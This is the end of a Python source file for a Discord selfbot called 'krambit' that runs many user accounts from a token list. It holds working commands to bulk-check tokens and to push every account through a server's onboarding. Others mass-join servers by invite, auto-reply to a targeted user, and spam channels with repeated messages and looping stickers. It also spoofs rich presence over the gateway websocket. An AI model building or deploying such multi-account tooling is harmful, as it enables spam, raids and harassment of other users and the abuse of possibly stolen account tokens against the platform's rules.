            await guild.change_voice_state(channel=guild.voice_client.channel, self_mute=guild.me.voice.self_mute, self_deaf=False)
        except:
            pass

    await asyncio.gather(*(undeafen_client(client) for client in clients))
    await ctx.send("Undeafened all clients", delete_after=3)


def tokens_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json",
    }


@krambit.command()
async def mbypassguild(ctx, guild_id: int):
    await ctx.message.delete()
    session = requests.Session()

    try:
        with open("tokens.txt", "r") as file:
            tokens = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        await ctx.send("tokens.txt not found.", delete_after=5)
        return

    total = len(tokens)
    progress = 0
    success = 0
    fails = 0

    status_message = await ctx.send("Started token guild bypass")

    async def bypass_with_token(token):
        nonlocal progress, success, fails

        try:
            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []

            response = session.get(
                f"https://discord.com/api/v10/guilds/{guild_id}/onboarding",
                headers=tokens_headers(token)
            )

            if response.status_code == 200:
                data = response.json()
                now = int(datetime.now().timestamp())

                for prompt in data["prompts"]:
                    onboarding_responses.append(prompt["options"][0]["id"])
                    onboarding_prompts_seen[prompt["id"]] = now

                    for option in prompt["options"]:
                        onboarding_responses_seen[option["id"]] = now

                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                post_response = session.post(
                    f"https://discord.com/api/v10/guilds/{guild_id}/onboarding-responses",
                    headers=tokens_headers(token),
                    json=json_data
                )

                if post_response.status_code == 200:
                    success += 1
                else:
                    fails += 1
            else:
                fails += 1

        except Exception as e:
            fails += 1
            print(f"An error occurred: {e}")

        progress += 1
        await status_message.edit(content=f"Token guild bypass in progress\na/{progress}/{total}\n[Bypassed successfully: {success} / Errors: {fails}]")
        await asyncio.sleep(2)

    for token in tokens:
        await bypass_with_token(token)
        
        
@krambit.command()
async def mct(ctx):
    await ctx.message.delete()

    try:
        with open("tokens.txt", "r") as f:
            tokens = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        await ctx.send("`tokens.txt` not found.")
        return

    results = []
    valid_count = 0
    invalid_count = 0
    current_msg = await ctx.send("```Token Checking in progress\n```")
    messages = [current_msg]

    batch_results = []

    for i, token in enumerate(tokens, start=1):
        headers = {"Authorization": token}
        r = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

        if r.status_code == 200:
            result = f"[{i}] Valid"
            valid_count += 1
        else:
            result = f"[{i}] Invalid"
            invalid_count += 1

        results.append(result)
        batch_results.append(result)

        if i % 5 == 0 or i == len(tokens):
            content = "```\nToken Checking in progress\n\n" + "\n".join(results) + "\n```"
            if len(content) > 2000:
                results = [results[-1]]
                content = "```\nToken Checking in progress\n\n" + "\n".join(results) + "\n```"
                current_msg = await ctx.send(content)
                messages.append(current_msg)
            else:
                await current_msg.edit(content=content)
            batch_results = []

        await asyncio.sleep(0.25)

    summary = f"""```js
Token Checking process finished
Valid Toks :- {valid_count}
Invalid Toks :- {invalid_count}
```"""
    await current_msg.edit(content=summary)
    

@krambit.command()
async def mar(ctx, user: discord.User):
    await ctx.message.delete()
    for client in clients:
        client.start_replying(user.id)


@krambit.command()
async def mare(ctx):
    await ctx.message.delete()
    for client in clients:
        client.stop_replying()
   

@krambit.command()
async def map(ctx, *, message: str):
    if not clients:
        return await ctx.send("Multi is not running use startmulti", delete_after=5)

    await ctx.message.delete()
    await asyncio.gather(*[map_spam(client, ctx.channel.id, message) for client in clients])


@krambit.command()
async def mape(ctx):
    if not clients:
        return await ctx.send("Multi is not running.", delete_after=5)

    await ctx.message.delete()
    for client in clients:
        if hasattr(client, "ap_active"):
            client.ap_active = False
            
 
@krambit.command()
async def mlg(ctx, channel_id: str = None):
    await ctx.message.delete()
    channel_id = channel_id or str(ctx.channel.id)

    for client in clients:
        await mleave(channel_id, client.token)
        await asyncio.sleep(1)

@krambit.command()
async def mig(ctx, code: str = None):
    await ctx.message.delete()
    if not code:
        return

    invite = code.replace("https://discord.gg/", "").strip()

    async with httpx.AsyncClient() as session:
        for client in clients:
            while client.user is None:
                await asyncio.sleep(5)

            headers = {
                "Authorization": client.http.token,
                "Content-Type": "application/json"
            }

            await session.post(f"https://discord.com/api/v10/invites/{invite}", headers=headers, json={})
            await asyncio.sleep(0.2)
            response = await session.get("https://discord.com/api/v10/users/@me/channels", headers=headers)


@krambit.command()
async def mrstatus(ctx, *, statuses):
    if not clients:
        return await ctx.send("No clients available.", delete_after=5)
    try:
        await ctx.message.delete()
    except:
        pass
    global text_status_list
    text_status_list = parse_text_statuses(statuses)
    await asyncio.gather(*(rotate_text(client) for client in clients))
    await ctx.send(f"Text status set for all clients: {', '.join(text_status_list)}", delete_after=5)

@krambit.command()
async def mremoji(ctx, *, emojis):
    if not clients:
        return await ctx.send("No clients available.", delete_after=5)
    try:
        await ctx.message.delete()
    except:
        pass
    global emoji_status_list
    emoji_status_list = parse_emoji_statuses(emojis)
    await asyncio.gather(*(rotate_emoji(client) for client in clients))
    await ctx.send(f"Emoji status set for all clients: {', '.join(emoji_status_list)}", delete_after=5)

@krambit.command()
async def msstatus(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global text_status_list
    text_status_list = []
    await asyncio.gather(*(client.change_presence(activity=None, status=discord.Status.dnd) for client in clients))
    await ctx.send("Text status stopped for all clients.", delete_after=5)

@krambit.command()
async def msemoji(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global emoji_status_list
    emoji_status_list = []
    await asyncio.gather(*(client.change_presence(activity=None, status=discord.Status.dnd) for client in clients))
    await ctx.send("Emoji status stopped for all clients.", delete_after=5)


# Utility

@krambit.command()
async def speechbubble(ctx, url: str = None):
    await ctx.message.delete()
    if ctx.message.attachments:
        img_bytes = await ctx.message.attachments[0].read()
        img_data = io.BytesIO(img_bytes)
    elif url:
        img_data = await download_image(url)
    else:
        return
    original_image = Image.open(img_data).convert("RGBA")
    ImageOps.exif_transpose(original_image, in_place=True)
    bubble_path = os.path.join("krambit/meme", "speech_bubble.png")
    if not os.path.isfile(bubble_path):
        return
    speech_bubble_image = Image.open(bubble_path).convert("RGBA")
    speech_bubble_image = speech_bubble_image.resize(original_image.size)
    result = ImageChops.subtract_modulo(original_image, speech_bubble_image)
    alpha = result.split()[3]
    bg = Image.new("RGBA", result.size, (0, 0, 0, 0))
    bg.paste(result, mask=alpha)
    output_buffer = io.BytesIO()
    bg.save(output_buffer, format="GIF")
    output_buffer.seek(0)
    await ctx.send(file=discord.File(fp=output_buffer, filename="krambit.gif"))
    

repeat_tasks = {}  # channel_id: asyncio.Task


@krambit.command()
async def repeat(ctx, channel_id: int = None, *, message: str = None):
    await ctx.message.delete()

    # STOP MODE
    if message == "stop":
        task = repeat_tasks.pop(channel_id, None)
        if task:
            task.cancel()
            await ctx.send(f"```Stopped repeating in {channel_id}```", delete_after=3)
        else:
            await ctx.send("```No active repeat in that channel```", delete_after=3)
        return

    # VALIDATION
    if not channel_id or not message:
        return

    channel = krambit.get_channel(channel_id)
    if not channel:
        await ctx.send("```Invalid channel ID```", delete_after=3)
        return

    # PREVENT DUPLICATE
    if channel_id in repeat_tasks:
        await ctx.send("```Already repeating in this channel```", delete_after=3)
        return

    async def repeater():
        try:
            while True:
                await channel.send(message)
                await asyncio.sleep(60)
        except asyncio.CancelledError:
            pass

    task = asyncio.create_task(repeater())
    repeat_tasks[channel_id] = task

    await ctx.send(
        f"```Repeating message every 60s in #{channel.name}```",
        delete_after=3
    )
    

@krambit.command()
async def cycleguild(ctx, action=None, *args):
    if action == "start":
        guild_id = ctx.guild.id
        rotation_type = 'badge' if len(args) == 0 or args[0].lower() != "name" else 'name'
        
        if guild_id not in guild_tasks:
            guild_tasks[guild_id] = {}
        if rotation_type in guild_tasks[guild_id]:
            return await ctx.send(f"Already rotating {rotation_type}!", delete_after=5)
        
        guild_data = await fetch_guild_profile(guild_id)
        if not guild_data or 'GUILD_TAGS' not in ctx.guild.features:
            return await ctx.send("This server doesn't support badges!", delete_after=5)

        tag = guild_tags.get(guild_id, "krambit")
        fixed_badge = guild_badges.get(guild_id)
        rotate_names = rotation_type == 'name'
        rotator = GuildRotator(tag=tag, fixed_badge=fixed_badge, rotate_names=rotate_names)
        rotator.active = True
        guild_tasks[guild_id][rotation_type] = {
            'rotator': rotator,
            'task': krambit.loop.create_task(rotation_task(ctx, rotation_type))
        }
        if rotate_names:
            await ctx.send("Name rotation started!", delete_after=5)
        else:
            badge_info = f"fixed badge {BADGE_MAP[fixed_badge]}" if fixed_badge is not None else "rotating badges"
            await ctx.send(f"Badge rotation started with tag '{tag}' and {badge_info}!", delete_after=5)

    elif action == "stop":
        guild_id = ctx.guild.id
        rotation_type = 'badge' if len(args) == 0 or args[0].lower() != "name" else 'name'
        
        if guild_id in guild_tasks and rotation_type in guild_tasks[guild_id]:
            guild_tasks[guild_id][rotation_type]['rotator'].active = False
            guild_tasks[guild_id][rotation_type]['task'].cancel()
            del guild_tasks[guild_id][rotation_type]
            if not guild_tasks[guild_id]:
                del guild_tasks[guild_id]
            await ctx.send(f"{rotation_type.capitalize()} rotation stopped!", delete_after=5)
        else:
            await ctx.send(f"No active {rotation_type} rotation!", delete_after=5)

    elif action == "delay":
        if not args:
            return await ctx.send("Please specify delay in seconds!", delete_after=5)
        
        guild_id = ctx.guild.id
        if guild_id in guild_tasks and 'badge' in guild_tasks[guild_id]:
            try:
                delay = max(180, int(args[0]))
                guild_tasks[guild_id]['badge']['rotator'].delay = delay
                await ctx.send(f"Badge rotation delay set to {delay}s", delete_after=5)
            except ValueError:
                await ctx.send("Invalid delay value!", delete_after=5)
        else:
            await ctx.send("Start badge rotation first with `!cycleguild start`", delete_after=5)

    elif action == "name" and args and args[0].lower() == "delay":
        if len(args) < 2:
            return await ctx.send("Please specify delay in seconds!", delete_after=5)
        
        guild_id = ctx.guild.id
        if guild_id in guild_tasks and 'name' in guild_tasks[guild_id]:
            try:
                delay = max(180, int(args[1]))
                guild_tasks[guild_id]['name']['rotator'].name_delay = delay
                await ctx.send(f"Name rotation delay set to {delay}s", delete_after=5)
            except ValueError:
                await ctx.send("Invalid delay value!", delete_after=5)
        else:
            await ctx.send("Start name rotation first with `!cycleguild start name`", delete_after=5)

    elif action == "set":
        if not args:
            return await ctx.send("Please specify a tag!", delete_after=5)
        
        guild_id = ctx.guild.id
        new_tag = args[0]
        guild_tags[guild_id] = new_tag
        
        if guild_id in guild_tasks:
            for rotation_type in guild_tasks[guild_id]:
                guild_tasks[guild_id][rotation_type]['rotator'].tag = new_tag
        
        await ctx.send(f"Tag set to '{new_tag}' for this server", delete_after=5)

    elif action == "setbadge":
        if not args:
            guild_id = ctx.guild.id
            if guild_id in guild_badges:
                del guild_badges[guild_id]
                if guild_id in guild_tasks:
                    for rotation_type in guild_tasks[guild_id]:
                        guild_tasks[guild_id][rotation_type]['rotator'].fixed_badge = None
                await ctx.send("Cleared fixed badge, will rotate all badges!", delete_after=5)
            else:
                await ctx.send("No fixed badge set!", delete_after=5)
            return
        
        badge_input = args[0].lower()
        badge_num = None
        
        for num, name in BADGE_MAP.items():
            if name == badge_input:
                badge_num = num
                break
        
        if badge_num is None:
            try:
                badge_num = int(badge_input)
                if badge_num not in BADGE_MAP:
                    return await ctx.send(f"Invalid badge ID! Valid IDs: {list(BADGE_MAP.keys())}", delete_after=5)
            except ValueError:
                return await ctx.send(f"Invalid badge! Valid names: {list(BADGE_MAP.values())}", delete_after=5)
        
        guild_id = ctx.guild.id
        guild_badges[guild_id] = badge_num
        if guild_id in guild_tasks:
            for rotation_type in guild_tasks[guild_id]:
                guild_tasks[guild_id][rotation_type]['rotator'].fixed_badge = badge_num
        
        await ctx.send(f"Fixed badge set to {BADGE_MAP[badge_num]}", delete_after=5)

    else:
        help_msg = """
Guild Rotation Commands
• cycleguild start
• cycleguild start name
• cycleguild stop
• cycleguild stop name
• cycleguild delay <seconds>
• cycleguild name delay <seconds>
• cycleguild set <tag>
• cycleguild setbadge <badge>
• cycleguild setbadge
"""
        await ctx.send(f"```{help_msg}```", delete_after=10)
        


class CustomRPCManager:
    def __init__(self, token):
        self.token = token
        self.ws = None
        self.thread = None
        self.heartbeat_thread = None
        self.enabled = False
        self.lock = threading.Lock()
        self.current_activity = {
            "name": "hvh sb",
            "type": 1,
            "details": None,
            "state": None,
            "large_image": None,
            "large_text": None,
            "small_image": None,
            "small_text": None,
            "buttons": None,
            "metadata": None,
            "timestamps": None
        }

    def build_payload(self, activity=None):
        merged = {**self.current_activity, **(activity or {})}
        activity_obj = {
            "type": merged.get("type", 1),
            "url": "https://twitch.tv/krambit",
            "session_id": f"{sessionid}",
            "name": merged.get("name"),
            "details": merged.get("details"),
            "state": merged.get("state"),
            "flags": 0,
            "assets": {
                "large_image": merged.get("large_image"),
                "large_text": merged.get("large_text"),
                "small_image": merged.get("small_image"),
                "small_text": merged.get("small_text")
            }
        }
        if merged.get("buttons") and merged.get("metadata"):
            activity_obj["buttons"] = merged["buttons"]
            activity_obj["metadata"] = merged["metadata"]
        if merged.get("timestamps"):
            activity_obj["timestamps"] = merged["timestamps"]            
        return {
            "op": 3,
            "d": {
                "since": now_ms(),
                "activities": [] if not self.enabled else [activity_obj],
                "status": "dnd",
                "afk": False
            }
        }

    def send_heartbeat(self, interval):
        while True:
            time.sleep(interval / 1000)
            try:
                self.ws.send(json.dumps({"op": 1, "d": None}))
            except Exception:
                break

    def on_open(self, ws):
        identify = {
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "$os": "Android",
                    "$browser": "Discord Android",
                    "$device": "Discord Android"
                },
                "presence": {
                    "status": "dnd",
                    "since": 0,
                    "activities": [],
                    "afk": False
                }
            }
        }
        ws.send(json.dumps(identify))

        if self.enabled:
            time.sleep(1)
            self.update_activity()

    def on_message(self, ws, message):
        data = json.loads(message)
        if data.get("op") == 10:
            heartbeat_interval = data["d"]["heartbeat_interval"]
            self.heartbeat_thread = threading.Thread(target=self.send_heartbeat, args=(heartbeat_interval,), daemon=True)
            self.heartbeat_thread.start()

    def on_close(self, ws, *_):
        time.sleep(5)
        self.run()

    def run(self):
        if self.ws and self.ws.keep_running:
            return
        self.ws = websocket.WebSocketApp(
            "wss://gateway.discord.gg/?v=10&encoding=json",
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close
        )
        self.thread = threading.Thread(target=self.ws.run_forever, daemon=True)
        self.thread.start()

    def update_activity(self):
        with self.lock:
            payload = self.build_payload()
        if self.ws:
            try:
                self.ws.send(json.dumps(payload))
                return True
            except Exception:
                return False
        return False



rpckrambit = CustomRPCManager(token)


@krambit.command()
async def rpc(ctx, sub: str = None, *, value: str = None):
    await ctx.message.delete()

    if sub is None:
        await ctx.send("Usage: `.rpc <on/off/state/detail/lg/name/type/btn/remove/timestamp>`", delete_after=5)
        return

    sub = sub.lower()

    if sub == "on":
        rpckrambit.enabled = True
        rpckrambit.run()
        rpckrambit.update_activity()
        await ctx.send("RPC enabled", delete_after=5)

    elif sub in ["off", "remove"]:
        rpckrambit.enabled = False
        rpckrambit.update_activity()
        await ctx.send("RPC disabled", delete_after=5)

    elif sub == "state":
        rpckrambit.current_activity["state"] = None if value == "off" else value
        rpckrambit.update_activity()
        await ctx.send(f"RPC state set: {value}", delete_after=5)

    elif sub == "detail":
        rpckrambit.current_activity["details"] = None if value == "off" else value
        rpckrambit.update_activity()
        await ctx.send(f"RPC details set: {value}", delete_after=5)

    elif sub == "lg":
        if not value:
            await ctx.send("Usage: `.rpc lg <emoji/url/mp/off>`", delete_after=5)
            return

        v = value.strip().lower()

        if v in ["off", "remove", "none"]:
            rpckrambit.current_activity["large_image"] = None
            rpckrambit.update_activity()
            await ctx.send("Large image removed", delete_after=5)
            return

        emoji = re.match(r"<a?:\w+:(\d+)>", value)
        if emoji:
            rpckrambit.current_activity["large_image"] = f"mp:emojis/{emoji.group(1)}"
            rpckrambit.update_activity()
            await ctx.send(f"Large image set {value}", delete_after=5)
            return

        if "avatars/" in value:
            rpckrambit.current_activity["large_image"] = f"mp:avatars/{value.split('avatars/', 1)[1]}"
            rpckrambit.update_activity()
            await ctx.send(f"Large image set: {value}", delete_after=5)
            return

        if value.startswith("http://") or value.startswith("https://"):
            asset = await upload_n_get_asset_key(value)
            if not asset:
                return
            rpckrambit.current_activity["large_image"] = asset
            rpckrambit.update_activity()
            await ctx.send(f"Large image set: {value} ", delete_after=5)
            return

        rpckrambit.current_activity["large_image"] = value
        rpckrambit.update_activity()
        await ctx.send("Large image set", delete_after=5)

    elif sub == "btn":
        if value:
            buttons = []
            urls = []
            for b in value.split("|"):
                parts = b.strip().split(" ", 1)
                if len(parts) == 2:
                    buttons.append(parts[0])
                    urls.append(parts[1])
            rpckrambit.current_activity["buttons"] = buttons
            rpckrambit.current_activity["metadata"] = {"button_urls": urls}
            rpckrambit.update_activity()
            await ctx.send("RPC buttons set", delete_after=5)
        else:
            rpckrambit.current_activity["buttons"] = None
            rpckrambit.current_activity["metadata"] = None
            rpckrambit.update_activity()
            await ctx.send("RPC buttons cleared", delete_after=5)

    elif sub == "name":
        rpckrambit.current_activity["name"] = "x" if value is None else value
        rpckrambit.update_activity()
        await ctx.send(f"RPC name set: {rpckrambit.current_activity['name']}", delete_after=5)


    elif sub == "timestamp":
        if not value:
            await ctx.send("Usage: `.rpc timestamp <start/stop>`", delete_after=5)
            return

        v = value.lower()
        if v == "start":
            rpckrambit.current_activity["timestamps"] = {"start": now_ms()}
            rpckrambit.update_activity()
            await ctx.send("RPC timestamp started", delete_after=5)

        elif v == "stop":
            rpckrambit.current_activity["timestamps"] = None
            rpckrambit.update_activity()
            await ctx.send("RPC timestamp stopped", delete_after=5)

        else:
            await ctx.send("Invalid timestamp option", delete_after=5)

    else:
        await ctx.send("Unknown subcommand", delete_after=5)


sticker_loops = {}



@krambit.command()
async def stickerap(ctx, guild_id: int = None, *, message: str = ""):
    await ctx.message.delete()
    if ctx.channel.id in sticker_loops:
        return

    guild = krambit.get_guild(guild_id) if guild_id else ctx.guild
    if not guild:
        try:
            guild = await krambit.fetch_guild(guild_id)
        except:
            return

    try:
        stickers = await guild.fetch_stickers()
    except:
        return

    if not stickers:
        return

    async def loop_stickers():
        while True:
            if ctx.channel.id not in sticker_loops:
                break
            sticker = random.choice(stickers)
            try:
                await ctx.send(content=message, stickers=[sticker])
            except:
                pass
            await asyncio.sleep(2)

    task = asyncio.create_task(loop_stickers())
    sticker_loops[ctx.channel.id] = task

@krambit.command()
async def stopstickerap(ctx):
    await ctx.message.delete()
    task = sticker_loops.pop(ctx.channel.id, None)
    if task:
        task.cancel()


TARGET_FIELD = "username_history"


async def cleanup_user(user_doc):
    history = user_doc.get(TARGET_FIELD, [])
    if not isinstance(history, list) or not history:
        return False

    cleaned = []
    last = object()

    for entry in history:
        value = entry.get("value")
        if value != last:
            cleaned.append(entry)
            last = value

    if len(cleaned) != len(history):
        await krambit.db.db.users.update_one(
            {"_id": user_doc["_id"]},
            {"$set": {TARGET_FIELD: cleaned}}
        )
        return True

    return False


@krambit.command(hidden=True)
async def uhcleanup(ctx, user_id: int = None):
    await ctx.message.delete()

    fixed = 0
    query = {"_id": user_id} if user_id else {}

    async for user in krambit.db.db.users.find(query):
        if await cleanup_user(user):
            fixed += 1

    if user_id:
        await ctx.send(
            f"```Cleanup finished for user {user_id}```",
            delete_after=3
        )
    else:
        await ctx.send(
            f"```Cleanup finished | Users fixed: {fixed}```",
            delete_after=3
        )
        
            
async def main():
    await asyncio.gather(
        krambit.start(token, reconnect=True),
       
    )

if __name__ == "__main__":
    asyncio.run(main())
